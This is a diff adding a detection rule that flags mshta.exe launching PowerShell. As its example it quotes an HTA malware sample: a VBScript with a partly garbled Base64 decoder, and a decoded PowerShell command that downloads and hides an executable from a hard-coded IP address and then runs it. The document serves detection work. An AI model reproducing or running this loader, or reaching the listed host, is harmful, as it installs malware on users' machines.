@@ -1,0 +1,85 @@
+Mshta runs powershell
+
+Condition:
+
+[FileName] = 'MSHTA.EXE' AND
+[BehaviorProcessCreateProcess] = 1 AND
+[FileName_Target] = 'POWERSHELL.EXE'
+
+
+Example:
+
+"C:\Windows\system32\mshta.exe" http://205.185.125.244/1.hta
+
+Content of 1.hta file
+
+ALL
+ASCII
+WIDE
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html
+charset=utf-8" http-equiv="Content-Type" />
+<script language="VBScript">
+Function Base64Decode(ByVal base64String)
+Const Base64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+Dim dataLength, sOut, groupBegin
+base64String = Replace(base64String, vbCrLf, "")
+base64String = Replace(base64String, vbTab, "")
+base64String = Replace(base64String, " ", "")
+dataLength = Len(base64String)
+If dataLength Mod 4 <> 0 Then
+Err.Raise 1, "Base64Decode", "Bad Base64 string."
+Exit Function
+End If
+For groupBegin = 1 To dataLength Step 4
+Dim numDataBytes, CharCounter, thisChar, thisData, nGroup, pOut
+numDataBytes = 3
+nGroup = 0
+For CharCounter = 0 To 3
+thisChar = Mid(base64String, groupBegin + CharCounter, 1)
+If thisChar = "=" Then
+numDataBytes = numDataBytes - 1
+thisData = 0
+thisData = InStr(1, Base64, thisChar, vbBinaryCompare) - 1
+If thisData = -1 Then
+Err.Raise 2, "Base64Decode", "Bad character In Base64 string."
+nGroup = 64 * nGroup + thisData
+nGroup = Hex(nGroup)
+nGroup = String(6 - Len(nGroup), "0")
+nGroup
+pOut = Chr(CByte("
+Mid(nGroup, 1, 2))) + _
+Chr(CByte("
+Mid(nGroup, 3, 2))) + _
+Mid(nGroup, 5, 2)))
+sOut = sOut
+Left(pOut, numDataBytes)
+Base64Decode = sOut
+End Function
+Dim encodedString
+Dim decodedString
+Dim oShell
+encodedString = "cG93ZXJzaGVsbC5leGUgLUV4ZWN1dGlvblBvbGljeSBieXBhc3MgLVdpbmRvd1N0eWxlIGhpZGRlbiAtbm9sb2dvICRvc0NoZWNrTWFqb3IgPSBbU3lzdGVtLkVudmlyb25tZW50XTo6T1NWZXJzaW9uLlZlcnNpb24gfCBTZWxlY3QgLUV4cGFuZCBNYWpvcjskb3NDaGVja01pbm9yID0gW1N5c3RlbS5FbnZpcm9ubWVudF06Ok9TVmVyc2lvbi5WZXJzaW9uIHwgU2VsZWN0IC1FeHBhbmQgTWlub3I7JG9zVmVyc2lvbiA9ICIkb3NDaGVja01ham9yIiArICcuJyArICIkb3NDaGVja01pbm9yIjskcG9zaFZlcnNpb24gPSAkUFNWZXJzaW9uVGFibGUuUFNWZXJzaW9uLk1ham9yO2lmKCRwb3NoVmVyc2lvbiAtZXEgMil7JHJhbmRvbUludCA9IEdldC1SYW5kb20gLU1pbmltdW0gNSAtTWF4aW11bSAxMDskcmFuZG9tU3RyID0gLWpvaW4gKCg2NS4uOTApICsgKDk3Li4xMjIpIHwgR2V0LVJhbmRvbSAtQ291bnQgJHJhbmRvbUludCB8ICUge1tjaGFyXSRffSk7JHBlTmFtZSA9ICRyYW5kb21TdHIgKyAnLmV4ZSc7JHNhdmVQYXRoID0gIiRlbnY6QVBQREFUQSIgKyAnXCcgKyAiJHBlTmFtZSI7Ozs7OyRwZURpcmVjdFVSTCA9ICdodHRwOi8vMjA1LjE4NS4xMjUuMjQ0LzEuZXhlJzskd2ViQ2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudDskd2ViRG93bmxvYWQgPSAkd2ViQ2xpZW50LkRvd25sb2FkRmlsZSgkcGVEaXJlY3RVUkwsICRzYXZlUGF0aCl9ZWxzZWlmKCRwb3NoVmVyc2lvbiAtZ2UgMyl7JHJhbmRvbUludCA
+decodedString = Base64Decode(encodedString)
+set oShell = CreateObject("Wscript.Shell")
+oShell.Run(decodedString),0,true
+self.close()
+</script>
+<hta:application
+id="oHTA"
+applicationname="dlJXIOGW"
+application="yes"
+</hta:application>
+</head>
+<div>
+</div>
+<body>
+</body>
+</html>
+
+Executes Powershell Scripts
+
+cmdline:  "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ExecutionPolicy bypass -WindowStyle hidden -nologo $osCheckMajor = [System.Environment]::OSVersion.Version | Select -Expand Major;$osCheckMinor = [System.Environment]::OSVersion.Version | Select -Expand Minor;$osVersion = "$osCheckMajor" + '.' + "$osCheckMinor";$poshVersion = $PSVersionTable.PSVersion.Major;if($poshVersion -eq 2){$randomInt = Get-Random -Minimum 5 -Maximum 10;$randomStr = -join ((65..90) + (97..122) | Get-Random -Count $randomInt | % {[char]$_});$peName = $randomStr + '.exe';$savePath = "$env:APPDATA" + '\' + "$peName";;;;;$peDirectURL = 'http://205.185.125.244/1.exe';$webClient = New-Object System.Net.WebClient;$webDownload = $webClient.DownloadFile($peDirectURL, $savePath)}elseif($poshVersion -ge 3){$randomInt = Get-Random -Minimum 5 -Maximum 10;$randomStr = -join ((65..90) + (97..122) | Get-Random -Count $randomInt | % {[char]$_});$peName = $randomStr + '.exe';$savePath = "$env:APPDATA" + '\' + "$peName";;;;;$peDirectURL = 'http://205.185.125.244/1.exe';Invoke-WebRequest -Uri $peDirectURL -OutFile $savePath};Start-Process $savePath;;""
+
+
